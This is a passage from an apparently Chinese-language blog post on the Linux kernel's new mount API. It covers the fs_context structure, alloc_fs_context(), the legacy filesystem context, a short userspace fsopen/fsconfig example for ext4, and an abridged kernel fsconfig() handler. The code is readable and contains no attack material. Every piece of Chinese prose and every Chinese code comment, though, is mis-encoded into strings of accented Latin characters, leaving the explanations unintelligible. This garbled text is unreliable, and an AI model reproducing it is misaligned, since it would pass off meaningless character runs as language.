FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>fs_context</code> çš„å…·ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç”¨ä»¥ä¿å­˜åœ¨åˆ›å»ºä¸é‡æ–°é…ç½®ä¸€ä¸ª superblock ä¸­çš„å‚æ•°çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Superblock çš„åˆ›å»ºä¼šå¡«å……åˆ° -&gt;root ä¸­ï¼Œé‡æ–°é…ç½®éœ€è¦è¯¥å­—æ®µå·²ç»è®¾ç½®.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å‚è§ Documentation/filesystems/mount_api.txt</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span><span class="hljs-title">uapi_mutex</span>;</span><span class="hljs-comment">/* ç”¨æˆ·ç©ºé—´è®¿é—®çš„äº’æ–¥é” */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span>*<span class="hljs-title">fs_type</span>;</span><br><span class="hljs-type">void</span>*fs_private;<span class="hljs-comment">/* æ–‡ä»¶ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡ */</span><br><span class="hljs-type">void</span>*sget_key;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>*<span class="hljs-title">root</span>;</span><span class="hljs-comment">/* root ä¸ superblock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>*<span class="hljs-title">user_ns</span>;</span><span class="hljs-comment">/* å°†è¦æŒ‚è½½çš„ç”¨æˆ·å‘½åç©ºé—´ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>*<span class="hljs-title">net_ns</span>;</span><span class="hljs-comment">/* å°†è¦æŒ‚è½½çš„ç½‘ç»œ1å‘½åç©ºé—´ */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>*<span class="hljs-title">cred</span>;</span><span class="hljs-comment">/* æŒ‚è½½è€…çš„ credentials */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fc_log</span>*<span class="hljs-title">log</span>;</span><span class="hljs-comment">/* Logging buffer */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*source;<span class="hljs-comment">/* æº (eg. è®¾å¤‡è·¯å¾„) */</span><br><span class="hljs-type">void</span>*security;<span class="hljs-comment">/* Linux S&amp;M è®¾ç½® */</span><br><span class="hljs-type">void</span>*s_fs_info;<span class="hljs-comment">/* Proposed s_fs_info */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags;<span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags_mask;<span class="hljs-comment">/* Superblock flags that were changed */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>s_iflags;<span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>lsm_flags;<span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span><span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span><span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;<span class="hljs-comment">/* The phase the context is in */</span><br><span class="hljs-type">bool</span>need_free:<span class="hljs-number">1</span>;<span class="hljs-comment">/* éœ€è¦è°ƒç”¨ ops-&gt;free() */</span><br><span class="hljs-type">bool</span>global:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>fs_context</code> çš„åˆå§‹åŒ–åœ¨ <code>alloc_fs_context()</code> ä¸­å®Œæˆï¼Œåœ¨ <code>fsopen()</code> ä¸­å¯¹åº”çš„æ˜¯ <code>FS_CONTEXT_FOR_MOUNT</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_fs_context - åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡.</span><br><span class="hljs-comment"> * @fs_type: æ–‡ä»¶ç³»ç»Ÿç±»å‹.</span><br><span class="hljs-comment"> * @reference: The dentry from which this one derives (or NULL)//æƒ³ä¸å‡ºå’‹ç¿»</span><br><span class="hljs-comment"> * @sb_flags: Filesystem/superblock æ ‡å¿—ä½ (SB_*)</span><br><span class="hljs-comment"> * @sb_flags_mask: @sb_flags ä¸­å¯ç”¨çš„æˆå‘˜</span><br><span class="hljs-comment"> * @purpose: æœ¬æ¬¡é…ç½®çš„ç›®çš„.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿå¹¶åˆ›å»ºä¸€ä¸ªæŒ‚è½½ä¸Šä¸‹æ–‡ï¼ˆmount contextï¼‰ï¼ŒæŒ‚è½½ä¸Šä¸‹æ–‡è¢«ä»¥å¯¹åº”çš„æ ‡å¿—ä½è¿›è¡Œåˆå§‹åŒ–ï¼Œ</span><br><span class="hljs-comment"> * è‹¥ä»å¦ä¸€ä¸ª superblock ï¼ˆå¼•è‡ª @referenceï¼‰è¿›è¡Œ submount/automountï¼Œ</span><br><span class="hljs-comment"> * åˆ™å¯èƒ½ç”±ä»è¯¥ superblock æ‹·è´æ¥çš„å‚æ•°1ï¼ˆå¦‚å‘½åç©ºé—´ï¼‰.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> fs_context *<span class="hljs-title function_">alloc_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file_system_type *fs_type,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> dentry *reference,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags_mask,</span><br><span class="hljs-params">      <span class="hljs-keyword">enum</span> fs_context_purpose purpose)</span><br>&#123;<br><span class="hljs-type">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-type">int</span> ret = -ENOMEM;<br><br><span class="hljs-comment">// åˆ†é… fs_context ç»“æ„ä½“</span><br>fc = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br><span class="hljs-comment">// è®¾ç½®å¯¹åº”å±æ€§</span><br>fc-&gt;purpose= purpose;<br>fc-&gt;sb_flags= sb_flags;<br>fc-&gt;sb_flags_mask = sb_flags_mask;<br>fc-&gt;fs_type= get_filesystem(fs_type);<br>fc-&gt;cred= get_current_cred();<br>fc-&gt;net_ns= get_net(current-&gt;nsproxy-&gt;net_ns);<br><br>mutex_init(&amp;fc-&gt;uapi_mutex);<br><br><span class="hljs-comment">// ç”± purpose è®¾ç½®å¯¹åº”çš„å‘½åç©ºé—´</span><br><span class="hljs-keyword">switch</span> (purpose) &#123;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_MOUNT:<br>fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:<br><span class="hljs-type">atomic_inc</span>(&amp;reference-&gt;d_sb-&gt;s_active);<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br>fc-&gt;root = dget(reference);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> è®©æ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿæ— æ¡ä»¶æ”¯æŒè¿™å— */</span><br>init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>init_fs_context = legacy_init_fs_context;<br><br><span class="hljs-comment">// åˆå§‹åŒ– fs_context</span><br>ret = init_fs_context(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br>fc-&gt;need_free = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">return</span> fc;<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ERR_PTR(ret);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å®Œæˆäº†é€šç”¨çš„åˆå§‹åŒ–å·¥ä½œåï¼Œæœ€ç»ˆè¿›è¡Œå…·ä½“æ–‡ä»¶ç³»ç»Ÿå¯¹åº”åˆå§‹åŒ–å·¥ä½œçš„å…¶å®æ˜¯è°ƒç”¨ <code>file_system_type</code> ä¸­çš„ <code>init_fs_context</code> å‡½æ•°æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°å®Œæˆçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹äºæœªè®¾ç½® <code>init_fs_context</code> çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹è€Œè¨€å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>legacy_init_fs_context()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸»è¦å°±æ˜¯ä¸º <code>fs_context-&gt;fs_private</code> åˆ†é…ä¸€ä¸ª <code>legacy_fs_context</code> ç»“æ„ä½“ï¼Œå¹¶å°† <code>fs_context</code> çš„å‡½æ•°è¡¨è®¾ç½®ä¸º <code>legacy_fs_context_ops</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_init_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br>fc-&gt;fs_private = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> legacy_fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc-&gt;fs_private)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>fc-&gt;ops = &amp;legacy_fs_context_ops;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>legacy_fs_context</code> ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹ï¼Œæ ‡è¯†äº†ä¸€å—æŒ‡å®šé•¿åº¦ä¸ç±»å‹çš„ç¼“å†²åŒºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> &#123;</span><br><span class="hljs-type">char</span>*legacy_data;<span class="hljs-comment">/* Data page for legacy filesystems */</span><br><span class="hljs-type">size_t</span>data_size;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">legacy_fs_param</span><span class="hljs-title">param_type</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="Step-II-fsconfig-è®¾ç½®-filesystem-context-çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ">Step.II - fsconfig: è®¾ç½® filesystem context çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ</h3><p>åœ¨å®Œæˆäº†ç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹å…¶è¿›è¡Œç›¸åº”çš„é…ç½®ï¼Œä»¥ä¾¿äºåç»­çš„æŒ‚è½½æ“ä½œï¼Œè¿™ä¸ªé…ç½®çš„åŠŸèƒ½å¯¹åº”åˆ°çš„å°±æ˜¯ <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨</p><p><code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨æ ¹æ®ä¸åŒçš„ cmd è¿›è¡Œä¸åŒçš„æ“ä½œï¼Œå¯¹äºæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿè€Œè¨€å…¶æ ¸å¿ƒæ“ä½œä¸»è¦å°±æ˜¯ä¸¤ä¸ª cmdï¼š</p><ul><li><code>FSCONFIG_SET_STRING</code> ï¼šè®¾ç½®ä¸åŒçš„é”®å€¼å¯¹å‚æ•°</li><li><code>FSCONFIG_CMD_CREATE</code>ï¼šè·å¾—ä¸€ä¸ª superblock å¹¶åˆ›å»ºä¸€ä¸ª root entry</li></ul><p>ç¤ºä¾‹ç”¨æ³•å¦‚ä¸‹æ‰€ç¤ºï¼Œè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªé”®å€¼å¯¹ <code>&quot;source&quot;=/dev/sdb1</code> è¡¨ç¤ºæ–‡ä»¶ç³»ç»Ÿæºæ‰€åœ¨çš„è®¾å¤‡åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="âœ³-fsconfig-in-kernel">âœ³ fsconfig() in kernel</h4><p>å†…æ ¸ç©ºé—´ä¸­çš„ <code>fsconfig()</code> å®ç°æ¯”è¾ƒé•¿ï¼Œä½†ä¸»è¦å°±æ˜¯æ ¹æ® cmd è¿›è¡Œå„ç§ switchï¼Œè¿™é‡Œå°±ä¸è´´å®Œæ•´çš„æºç äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE5(fsconfig,<br><span class="hljs-type">int</span>, fd,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br><span class="hljs-type">int</span>, aux)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>.type= fs_value_is_undefined,<br>&#125;;<br><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br><span class="hljs-comment">// ä¸»è¦æ˜¯å‚æ•°çš„å„ç§æ£€æŸ¥</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>&#125;<br><br><span class="hljs-comment">// è·å–æ–‡ä»¶æè¿°ç¬¦</span><br>f = fdget(fd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br><span class="hljs-keyword">goto</span> out_f;<br><br><span class="hljs-comment">// è·å– fs_contextï¼Œå­˜å‚¨åœ¨æ–‡ä»¶æè¿°ç¬¦çš„ private_data å­—æ®µ</span><br>fc = f.file-&gt;private_data;<br><span class="hljs-keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;<br><span class="hljs-keyword">switch</span> (cmd) &#123; <span class="hljs-comment">// ä¸€ä¸ªæ“ä½œéƒ½æ²¡å®ç°</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>ret = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// æ‹·è´ key å­—æ®µåˆ°å†…æ ¸ç©ºé—´</span><br><span class="hljs-keyword">if</span> (_key) &#123;<br>param.key = strndup_user(_key, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.key)) &#123;<br>ret = PTR_ERR(param.key);<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// æ ¹æ®ä¸åŒçš„ cmd è¿›è¡Œ param çš„ä¸åŒè®¾ç½®</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">// ...</span><br><span class="hljs-comment">// æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™ä¸ª cmd</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>param.type = fs_value_is_string;<br>param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// æ ¹æ®å‰é¢è®¾ç½®çš„ param è¿›è¡Œ VFS ç›¸å…³æ“ä½œ</span><br>ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<br>mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>&#125;<br><br><span class="hljs-comment">/* Clean up the our record of any value that we obtained from</span><br><span class="hljs-comment"> * userspace.  Note that the value may have been stolen by the LSM or</span><br><span class="hljs-comment"> * filesystem, in which case the value pointer will have been cleared.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-comment">// ä¸´æ—¶æ•°æ®æ¸…ç†å·¥ä½œ</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>out_key:<br>kfree(param.key);<br>out_f:<br>fdput(f);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>fsconfig()</code> çš„æ ¸å¿ƒä½œç”¨ä¸»è¦è¿˜æ˜¯æ ¹æ® cmd è¿›è¡Œå‚æ•°çš„å°è£…ï¼Œæœ€åè¿›å…¥åˆ° VFS ä¸­çš„æ“ä½œåˆ™é€šè¿‡ <code>vfs_fsconfig_locked()</code> å®Œæˆ</p><h3 id="Step-III-fsmount-è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹">Step.III - fsmount: è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹</h3><p>å®Œæˆäº†æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¸é…ç½®ï¼Œæ¥ä¸‹æ¥ç»ˆäºæ¥åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½æ“ä½œäº†ï¼Œ<code>fsmount()</code> 